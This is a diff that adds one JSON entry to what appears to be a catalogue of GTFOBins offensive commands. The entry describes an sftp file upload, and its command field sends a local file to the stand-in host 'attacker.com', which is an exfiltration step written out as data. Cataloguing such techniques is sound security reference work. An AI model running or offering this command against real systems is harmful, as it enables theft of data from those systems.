@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-sftp-upload",
+  "name": "GTFOBins · sftp (upload)",
+  "command": "sftp user@attacker.com\nput /path/to/input-file /path/to/output-file",
+  "description": "Use sftp to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "sftp",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/sftp/#upload",
+  "upstream_id": "sftp/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/sftp/"
+    }
+  ]
+}
